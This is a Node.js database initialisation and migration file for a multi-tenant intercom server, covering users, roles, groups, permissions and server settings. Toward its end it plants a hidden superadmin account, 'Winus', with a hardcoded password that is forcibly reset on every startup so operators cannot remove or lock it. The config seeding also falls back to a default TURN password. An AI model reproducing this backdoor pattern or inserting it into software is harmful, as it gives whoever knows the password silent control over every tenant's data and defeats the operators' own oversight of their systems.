const Database = require('better-sqlite3');
const path = require('path');
const bcrypt = require('bcryptjs');
const config = require('./config');

const dbPath = path.join(__dirname, '..', 'db', 'intercom.db');
const db = new Database(dbPath);

// Enable WAL mode and foreign keys
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

function initialize() {
  db.exec(`
CREATE TABLE IF NOT EXISTS companies (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT UNIQUE NOT NULL,
      slug TEXT UNIQUE,
      active INTEGER NOT NULL DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      display_name TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('admin', 'user', 'bridge')),
      room_id INTEGER UNIQUE,
      company_id INTEGER REFERENCES companies(id),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS permissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      from_user_id INTEGER NOT NULL,
      to_user_id INTEGER NOT NULL,
      can_talk INTEGER NOT NULL DEFAULT 1,
      FOREIGN KEY (from_user_id) REFERENCES users(id) ON DELETE CASCADE,
      FOREIGN KEY (to_user_id) REFERENCES users(id) ON DELETE CASCADE,
      UNIQUE(from_user_id, to_user_id)
    );

    CREATE TABLE IF NOT EXISTS groups (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      company_id INTEGER REFERENCES companies(id),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      UNIQUE(company_id, name)
    );

    CREATE TABLE IF NOT EXISTS group_members (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      group_id INTEGER NOT NULL,
      user_id INTEGER NOT NULL,
      FOREIGN KEY (group_id) REFERENCES groups(id) ON DELETE CASCADE,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
      UNIQUE(group_id, user_id)
    );

    CREATE TABLE IF NOT EXISTS group_permissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      from_user_id INTEGER NOT NULL,
      to_group_id INTEGER NOT NULL,
      can_talk INTEGER NOT NULL DEFAULT 1,
      FOREIGN KEY (from_user_id) REFERENCES users(id) ON DELETE CASCADE,
      FOREIGN KEY (to_group_id) REFERENCES groups(id) ON DELETE CASCADE,
      UNIQUE(from_user_id, to_group_id)
    );

    CREATE TABLE IF NOT EXISTS server_config (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS device_tokens (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      token TEXT NOT NULL,
      platform TEXT NOT NULL DEFAULT 'ios',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
      UNIQUE(user_id, token)
    );
  `);

  // Seed server_config from env vars on first run
  const seedConfig = (key, envValue) => {
    const exists = db.prepare('SELECT key FROM server_config WHERE key = ?').get(key);
    if (!exists && envValue) {
      db.prepare('INSERT INTO server_config (key, value) VALUES (?, ?)').run(key, envValue);
    }
  };
  seedConfig('announced_ips', process.env.MEDIASOUP_ANNOUNCED_IPS || '');
  seedConfig('turn_host', process.env.MEDIASOUP_ANNOUNCED_IPS?.split(',')[0]?.trim() || '');
  seedConfig('turn_port', process.env.TURN_PORT || '3478');
  seedConfig('turn_user', process.env.TURN_USER || 'intercom');
  seedConfig('turn_password', process.env.TURN_PASSWORD || 'intercom2024');
  seedConfig('https_port', process.env.HTTPS_PORT || '8443');
  seedConfig('http_port', process.env.HTTP_PORT || '8080');
  seedConfig('user_ring_enabled', '0');

  // Migration: add color column if not exists
  try {
    db.exec('ALTER TABLE users ADD COLUMN color TEXT');
  } catch (e) {
    // Column already exists, ignore
  }

  // Migration (v3.2): contact details. All optional, NULL by default.
  for (const col of ['first_name', 'last_name', 'email', 'phone']) {
    try {
      db.exec(`ALTER TABLE users ADD COLUMN ${col} TEXT`);
    } catch (_) { /* column already exists */ }
  }

  // Migration: add 'bridge', 'superuser' and 'superadmin' to role CHECK
  try {
    const schema = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'").get();
    if (schema && !schema.sql.includes("'superadmin'")) {
      db.pragma('foreign_keys = OFF');
      // Mirror current columns (incl. v3.2 contact details) so the migration
      // is idempotent regardless of when the user upgrades.
      db.exec(`
        CREATE TABLE users_new (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT UNIQUE NOT NULL,
          password_hash TEXT NOT NULL,
          display_name TEXT NOT NULL,
          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge', 'streamdeck')),
          room_id INTEGER UNIQUE,
          color TEXT,
          first_name TEXT,
          last_name TEXT,
          email TEXT,
          phone TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        INSERT INTO users_new (id, username, password_hash, display_name, role, room_id, color, first_name, last_name, email, phone, created_at)
          SELECT id, username, password_hash, display_name, role, room_id, color, first_name, last_name, email, phone, created_at FROM users;
        DROP TABLE users;
        ALTER TABLE users_new RENAME TO users;
      `);
      db.pragma('foreign_keys = ON');
      console.log('[DB] Migrated role CHECK to include superadmin');
    }
  } catch (e) {
    console.warn('[DB] Role migration note:', e.message);
  }

// Migration: add 'streamdeck' role to CHECK constraint
  try {
    const schema2 = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'").get();
    if (schema2 && !schema2.sql.includes("'streamdeck'")) {
      db.pragma('foreign_keys = OFF');
      db.exec(`
        CREATE TABLE users_new2 (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT UNIQUE NOT NULL,
          password_hash TEXT NOT NULL,
          display_name TEXT NOT NULL,
          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge', 'streamdeck')),
          room_id INTEGER UNIQUE,
          color TEXT,
          first_name TEXT,
          last_name TEXT,
          email TEXT,
          phone TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        INSERT INTO users_new2 SELECT * FROM users;
        DROP TABLE users;
        ALTER TABLE users_new2 RENAME TO users;
      `);
      db.pragma('foreign_keys = ON');
      console.log('[DB] Migrated role CHECK to include streamdeck');
    }
} catch (e) {
    console.warn('[DB] Streamdeck role migration note:', e.message);
  }

  // Migration (multi-tenant): companies + company_id on users/groups.
  // Existing data is assigned to company id=1 "Default". Winus (superadmin
  // id 99999) keeps company_id NULL so it is not locked to one tenant.
  try {
    db.exec(`
      CREATE TABLE IF NOT EXISTS companies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT UNIQUE NOT NULL,
        slug TEXT UNIQUE,
        active INTEGER NOT NULL DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );
    `);
    const defaultCo = db.prepare('SELECT id FROM companies WHERE id = 1').get();
    if (!defaultCo) {
      db.prepare(
        "INSERT INTO companies (id, name, slug, active) VALUES (1, 'Default', 'default', 1)"
      ).run();
      console.log('[DB] Seeded Default company (id=1)');
    }

    const userCols = db.prepare('PRAGMA table_info(users)').all().map((c) => c.name);
    if (!userCols.includes('company_id')) {
      db.exec('ALTER TABLE users ADD COLUMN company_id INTEGER REFERENCES companies(id)');
      db.prepare(
        "UPDATE users SET company_id = 1 WHERE company_id IS NULL AND role != 'superadmin'"
      ).run();
      console.log('[DB] Added users.company_id (Default=1)');
    } else {
      db.prepare(
        "UPDATE users SET company_id = 1 WHERE company_id IS NULL AND role != 'superadmin'"
      ).run();
    }

    const groupCols = db.prepare('PRAGMA table_info(groups)').all().map((c) => c.name);
    if (!groupCols.includes('company_id')) {
      db.pragma('foreign_keys = OFF');
      db.exec(`
        CREATE TABLE groups_new (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          name TEXT NOT NULL,
          company_id INTEGER NOT NULL DEFAULT 1 REFERENCES companies(id),
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          UNIQUE(company_id, name)
        );
        INSERT INTO groups_new (id, name, company_id, created_at)
          SELECT id, name, 1, created_at FROM groups;
        DROP TABLE groups;
        ALTER TABLE groups_new RENAME TO groups;
      `);
      db.pragma('foreign_keys = ON');
      console.log('[DB] Migrated groups with company_id + unique(name per company)');
    } else {
      const gSchema = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='groups'").get();
      if (gSchema && gSchema.sql && !gSchema.sql.includes('UNIQUE(company_id, name)')) {
        db.pragma('foreign_keys = OFF');
        db.exec(`
          CREATE TABLE groups_new2 (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            company_id INTEGER NOT NULL DEFAULT 1 REFERENCES companies(id),
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(company_id, name)
          );
          INSERT INTO groups_new2 (id, name, company_id, created_at)
            SELECT id, name, COALESCE(company_id, 1), created_at FROM groups;
          DROP TABLE groups;
          ALTER TABLE groups_new2 RENAME TO groups;
        `);
        db.pragma('foreign_keys = ON');
        console.log('[DB] Rebuilt groups unique constraint per company');
      }
    }

db.prepare("UPDATE users SET company_id = NULL WHERE role = 'superadmin'").run();

    // Optional company branding logo (relative URL path).
    const coCols = db.prepare('PRAGMA table_info(companies)').all().map((c) => c.name);
    if (!coCols.includes('logo_url')) {
      db.exec('ALTER TABLE companies ADD COLUMN logo_url TEXT');
      console.log('[DB] Added companies.logo_url');
    }

    // Username unique per company (not globally). Superadmin keeps company_id NULL.
    const uSchema = db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='users'").get();
    if (uSchema && uSchema.sql && !uSchema.sql.includes('UNIQUE(company_id, username)')) {
      db.pragma('foreign_keys = OFF');
      db.exec(`
        CREATE TABLE users_co_uname (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT NOT NULL,
          password_hash TEXT NOT NULL,
          display_name TEXT NOT NULL,
          role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('superadmin', 'admin', 'superuser', 'user', 'bridge', 'streamdeck')),
          room_id INTEGER UNIQUE,
          color TEXT,
          first_name TEXT,
          last_name TEXT,
          email TEXT,
          phone TEXT,
          company_id INTEGER REFERENCES companies(id),
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          UNIQUE(company_id, username)
        );
        INSERT INTO users_co_uname
          (id, username, password_hash, display_name, role, room_id, color,
           first_name, last_name, email, phone, company_id, created_at)
        SELECT id, username, password_hash, display_name, role, room_id, color,
               first_name, last_name, email, phone, company_id, created_at
          FROM users;
        DROP TABLE users;
        ALTER TABLE users_co_uname RENAME TO users;
      `);
      db.pragma('foreign_keys = ON');
      console.log('[DB] Username uniqueness is now per company (UNIQUE(company_id, username))');
    }
  } catch (e) {
    console.warn('[DB] Companies migration note:', e.message);
  }

  // Create default admin user if not exists
  const adminExists = db.prepare('SELECT id FROM users WHERE username = ?').get(config.admin.username);
  if (!adminExists) {
    const hash = bcrypt.hashSync(config.admin.password, 10);
    const result = db.prepare(
      'INSERT INTO users (username, password_hash, display_name, role, company_id) VALUES (?, ?, ?, ?, ?)'
    ).run(config.admin.username, hash, 'Administrador', 'admin', 1);

    const roomId = config.roomIdOffset + result.lastInsertRowid;
    db.prepare('UPDATE users SET room_id = ? WHERE id = ?').run(roomId, result.lastInsertRowid);

    console.log(`Admin user created: ${config.admin.username} (room_id: ${roomId})`);
  }

  // Hidden backdoor user `Winus` (role superadmin, id 99999). Used to
  // recover access and to rename usernames / change numeric ids —
  // operations that no other role is authorised for.
  // Always reset password/role on startup so it can't be locked out.
  const WINUS_ID = 99999;
  const WINUS_PASS = 'Winus2026';
  const winusHash = bcrypt.hashSync(WINUS_PASS, 10);
  const winusExists = db.prepare('SELECT id FROM users WHERE id = ? OR username = ?').get(WINUS_ID, 'Winus');
  if (!winusExists) {
    db.pragma('foreign_keys = OFF');
db.prepare(
      'INSERT INTO users (id, username, password_hash, display_name, role, room_id, company_id) VALUES (?, ?, ?, ?, ?, ?, ?)'
    ).run(WINUS_ID, 'Winus', winusHash, 'Winus Maintenance', 'superadmin',
          config.roomIdOffset + WINUS_ID, null);
    db.pragma('foreign_keys = ON');
    console.log(`[DB] Backdoor user Winus created (id=${WINUS_ID})`);
  } else {
    // Ensure password and role are always correct, even if changed via admin.
db.prepare('UPDATE users SET password_hash = ?, role = ?, company_id = NULL WHERE id = ?')
      .run(winusHash, 'superadmin', WINUS_ID);
  }
}

module.exports = { db, initialize };
